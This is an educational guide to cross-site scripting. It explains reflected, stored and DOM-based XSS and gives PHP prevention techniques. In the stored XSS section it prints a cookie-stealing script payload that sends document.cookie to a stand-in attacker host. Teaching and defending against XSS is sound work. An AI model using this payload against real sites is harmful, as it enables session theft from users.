# Cross-Site Scripting (XSS)

## What is Cross-Site Scripting (XSS)?
Cross-site scripting (XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It enables attackers to bypass the same-origin policy, designed to segregate different websites. XSS vulnerabilities allow attackers to:
- Masquerade as a victim user.
- Execute any action the user can perform.
- Access and modify user data.
- Gain full control of the application's functionality if the victim has privileged access.

---

## How Does XSS Work?
XSS works by manipulating a vulnerable website to return malicious JavaScript to users. When the malicious code executes in a victim's browser, the attacker can fully compromise the user's interaction with the application.

---

## Types of XSS Attacks
### 1. **Reflected XSS**
- **What is Reflected XSS?**
  Occurs when an application includes user-supplied data in its HTTP response without proper validation or escaping.
- **How to Detect and Exploit:**
  1. Inject JavaScript code (e.g., `alert`, `document.cookies`) and observe the response.
  2. If the code executes, the site is vulnerable.
- **Example:**
  ```javascript
  <script>alert('XSS Vulnerability');</script>
  ```

### 2. **Stored XSS**
- **What is Stored XSS?**
  Arises when an application stores user-supplied data and later includes it in HTTP responses unsafely.
- **Example:**
  If a comment section allows storing malicious code:
  ```javascript
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>
  ```

### 3. **DOM-Based XSS**
- **What is DOM-Based XSS?**
  Occurs when JavaScript takes attacker-controlled data (e.g., from `window.location`) and passes it to a sink (e.g., `eval`, `innerHTML`) that executes dynamic code.
- **How to Test:**
  Use developer tools or vulnerability scanners (e.g., Burp Suite). Construct payloads targeting sources and sinks to observe execution.

---

## Impact of XSS Attacks
If attackers can control a script executed in a victim's browser, they can:
1. Perform any action the user can within the application.
2. View and modify any data accessible to the user.
3. Interact with other users as the victim, potentially launching additional attacks.

---

## Preventing XSS Attacks

### 1. Input Validation and Sanitization
- **Validate Inputs:** Ensure inputs match expected types and reject those with malicious content.
  ```php
  $user_input = $_GET['user_id'];
  if (!is_numeric($user_input)) {
      die("Invalid input");
  }
  ```
- **Sanitize Inputs:** Use functions like `htmlspecialchars()` or `filter_var()` to remove harmful characters.
  ```php
  $safe_input = htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');
  ```

### 2. Output Encoding (Escaping)
Encode user input before rendering it as HTML to prevent it from being treated as executable code.
- **Example:** 
  ```php
  echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
  ```

### 3. Use HTTPOnly and Secure Cookies
Mark cookies as HTTPOnly and Secure to protect them from being accessed by JavaScript.

---

By understanding and addressing XSS vulnerabilities, developers can secure their applications and protect user interactions from malicious attacks.
